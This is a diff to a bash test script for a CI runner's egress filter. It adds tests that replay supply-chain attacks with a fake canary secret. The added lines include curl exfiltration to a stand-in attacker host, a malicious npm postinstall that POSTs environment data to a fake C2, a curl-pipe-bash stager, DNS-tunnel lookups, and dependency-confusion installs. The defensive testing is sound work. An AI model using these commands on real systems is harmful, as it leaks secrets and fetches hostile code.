@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # safer-runner v2 real-runner checks.
-# usage: checks.sh <must-pass|must-fail|sudo-must-fail|ssrf|analyze|strict|privilege-removed|privilege-retained|crash-recovery|baseline>
+# usage: checks.sh <must-pass|must-fail|sudo-must-fail|ssrf|analyze|strict|privilege-removed|privilege-retained|crash-recovery|supply-chain|baseline>
 set -u
 cd "$(dirname "$0")/.."
 source v2test/lib.sh
@@ -428,6 +428,95 @@ crash_recovery() {
   { wait_active safer-runner-proxy 30 && wait_active safer-runner-dns 30; }; pass_if CR.both-restart $? "proxy + dns both active after a simultaneous SIGKILL"
   code=$(gh_zen -o /dev/null -w '%{http_code}' 2>&1)
   [ "$code" = 200 ]; pass_if CR.both-egress-recovers $? "api.github.com/zen -> $code after killing proxy+dns together"
+}
+
+# SC: real-world supply-chain attack REPLAYS. Each reproduces the behaviour of a named 2024-2025
+# incident, run as the runner user AFTER enforce is applied (the real threat model). Every scenario
+# uses a FAKE canary secret - never a real credential - and a SELF-CONTAINED sink: the attacker IP
+# ($ATTACKER_IP, a real host not on any allowlist) or a name that is not on the allowlist (so DNS
+# default-deny returns NXDOMAIN). We assert the exfil is stopped and the secret never leaves the VM;
+# no third-party pastebin/webhook is contacted, so the suite stays deterministic. No sudo needed.
+supply_chain() {
+  local canary payload enc q_dis q_allow out rc victim pkg
+  canary="sr-canary-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+  export SR_CANARY="$canary"
+  record SC.ctx INFO "threat model: malicious step as runner user after enforce; fake secret SR_CANARY=$canary (NOT a real credential); sinks=$ATTACKER_IP + non-allowlisted names"
+
+  # SC1 - tj-actions/changed-files (Mar 2025): harvest CI secrets, base64-encode, exfiltrate. We
+  # build a synthetic secrets blob (fake values only) as the compromised action did, then POST it
+  # over TLS to an attacker host forced to the sink IP. The proxy must never open a connection out.
+  payload=$(printf 'AWS_SECRET_ACCESS_KEY=%s\nGH_PAT=%s\nNPM_TOKEN=%s\n' "$canary" "$canary" "$canary" | base64 -w0)
+  never_reached SC1.tj-actions "fake-secrets blob base64-exfiltrated over TLS to attacker [tj-actions/changed-files replay]" "$ATTACKER_IP" \
+    curl -k -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "exfil.attacker.example:443:$ATTACKER_IP" \
+      --data-binary "$payload" https://exfil.attacker.example/collect
+  # same payload over plain HTTP with a disallowed Host (log-scrubbing variants used both)
+  expect_blocked SC1b.tj-actions-http "fake-secrets blob exfiltrated over plain HTTP to disallowed Host [tj-actions replay]" \
+    '.ev=="http" and .verdict=="BLOCK" and .host=="exfil.attacker.example"' \
+    curl -sS -m 15 -o /dev/null -w '%{http_code}' --resolve "exfil.attacker.example:80:$ATTACKER_IP" \
+      --data-binary "$payload" http://exfil.attacker.example/collect
+
+  # SC2 - Shai-Hulud npm worm (Sep 2025): a package's postinstall script phones home to a hardcoded
+  # C2 and exfiltrates tokens. Default-deny DNS means the hardcoded C2 never resolves, so the worm's
+  # exfil step fails before a byte leaves. We install the malicious package into a throwaway project
+  # with lifecycle scripts enabled, exactly as a transitive dependency would run.
+  pkg=/tmp/sc-evil-pkg; victim=/tmp/sc-victim
+  rm -rf "$pkg" "$victim"; mkdir -p "$pkg" "$victim"
+  cat > "$pkg/package.json" <<JSON
+{
+  "name": "sc-evil-pkg",
+  "version": "1.0.0",
+  "scripts": { "postinstall": "node -e \"fetch('https://c2.shaihulud.attacker.example/steal',{method:'POST',body:process.env.SR_CANARY}).then(()=>process.exit(0)).catch(()=>process.exit(7))\"" }
+}
+JSON
+  echo '{"name":"sc-victim","version":"1.0.0"}' > "$victim/package.json"
+  out=$(cd "$victim" && npm install --foreground-scripts --no-audit --no-fund --no-package-lock --loglevel=error "$pkg" 2>&1); rc=$?
+  sleep 0.5
+  grep -q " BLOCK A c2.shaihulud.attacker.example. " /var/log/safer-runner/dns.log \
+    && ! grep -q "c2.shaihulud.attacker.example. .*upstream=" /var/log/safer-runner/dns.log
+  pass_if SC2.shai-hulud $? "postinstall C2 c2.shaihulud.attacker.example NXDOMAIN'd by default-deny DNS, never forwarded [Shai-Hulud npm worm replay]; npm rc=$rc ${out: -60}"
+
+  # SC3 - curl | bash second-stage (codecov bash-uploader / xz-style staging): the first stage fetches
+  # a script from a hardcoded host and pipes it to a shell. The fetch must fail (name unresolvable),
+  # so the second stage - which would drop a marker file - never runs.
+  rm -f /tmp/sc-stage2.marker
+  # curl's stderr -> /dev/null so only the (empty, on failure) body reaches the shell, as `curl -s URL | bash` does
+  out=$(curl -fsS -m 10 https://cdn.stager.attacker.example/stage2.sh 2>/dev/null | bash 2>&1); rc=$?
+  sleep 0.5
+  [ ! -e /tmp/sc-stage2.marker ] && grep -q " BLOCK A cdn.stager.attacker.example. " /var/log/safer-runner/dns.log
+  pass_if SC3.curl-bash-stager $? "second-stage fetch from cdn.stager.attacker.example blocked, marker absent [curl|bash stager replay]; ${out: -60}"
+
+  # SC4 - DNS tunnelling (SUNBURST-style): encode the secret into DNS labels and look them up, both
+  # under a non-allowlisted zone AND under an ALLOWLISTED parent (objects.githubusercontent.com).
+  # Exact-by-default means even a subdomain of an allowed name is NXDOMAIN and is never forwarded, so
+  # the encoded secret never reaches any upstream resolver - no covert DNS data channel.
+  enc=$(printf '%s' "$canary" | od -An -tx1 | tr -d ' \n')
+  q_dis="${enc:0:28}.tunnel.attacker.example"
+  q_allow="${enc:0:28}.objects.githubusercontent.com"
+  out=$(dig +time=3 +tries=1 "$q_dis" A 2>&1 | grep -o 'status: [A-Z]*')
+  [ "$out" = "status: NXDOMAIN" ]; pass_if SC4.dns-tunnel-disallowed $? "encoded secret under non-allowlisted zone -> $out [SUNBURST-style DNS tunnel]"
+  out=$(dig +time=3 +tries=1 "$q_allow" A 2>&1 | grep -o 'status: [A-Z]*')
+  [ "$out" = "status: NXDOMAIN" ]; pass_if SC4.dns-tunnel-allowed-parent $? "encoded secret under ALLOWED parent objects.githubusercontent.com -> $out (exact-by-default blocks it)"
+  sleep 0.5
+  grep -q " BLOCK A $q_allow. NXDOMAIN" /var/log/safer-runner/dns.log && ! grep -q "$q_allow. .*upstream=" /var/log/safer-runner/dns.log
+  pass_if SC4.dns-tunnel-not-forwarded $? "the encoded-secret query under the allowed parent was NOT forwarded upstream (no DNS data channel)"
+
+  # SC5 - dependency confusion (2021-onward, incl. 2024-25 npm/pypi campaigns): the build resolves an
+  # internal-looking package from an attacker-chosen index/registry. That host is not on the allowlist,
+  # so it never resolves and the malicious package cannot be fetched.
+  out=$(python3 -m pip install --disable-pip-version-check --no-input --timeout 5 --retries 0 \
+        --index-url https://pypi.internal-corp.attacker.example/simple/ evilcorp-internal-sdk 2>&1); rc=$?
+  sleep 0.5
+  { [ $rc -ne 0 ] && grep -q " BLOCK A pypi.internal-corp.attacker.example. " /var/log/safer-runner/dns.log; }
+  pass_if SC5.pip-dependency-confusion $? "pip --index-url to attacker registry blocked (NXDOMAIN) [dependency-confusion replay]; rc=$rc ${out: -60}"
+  out=$(npm install --no-audit --no-fund --no-package-lock --fetch-retries=0 --loglevel=error \
+        --registry https://registry.internal-corp.attacker.example/ @internal-corp/private-sdk 2>&1); rc=$?
+  sleep 0.5
+  { [ $rc -ne 0 ] && grep -q " BLOCK A registry.internal-corp.attacker.example. " /var/log/safer-runner/dns.log; }
+  pass_if SC5b.npm-dependency-confusion $? "npm --registry to attacker registry blocked (NXDOMAIN) [dependency-confusion replay]; rc=$rc ${out: -60}"
+
+  # Aggregate: across every replay above, the proxy never opened a server connection to the attacker IP.
+  rc=$(jq -c "select(.ev==\"server-connect\" and (.peername // \"\" | startswith(\"$ATTACKER_IP:\")))" "$FLOWLOG" 2>/dev/null | wc -l)
+  [ "$rc" -eq 0 ]; pass_if SC.no-egress-to-sink $? "$rc proxy server-connects to $ATTACKER_IP across all replays (want 0)"
 }
 
 trap 'record "harness.$1" FAIL "checks.sh $1 aborted (line $LINENO)"' EXIT
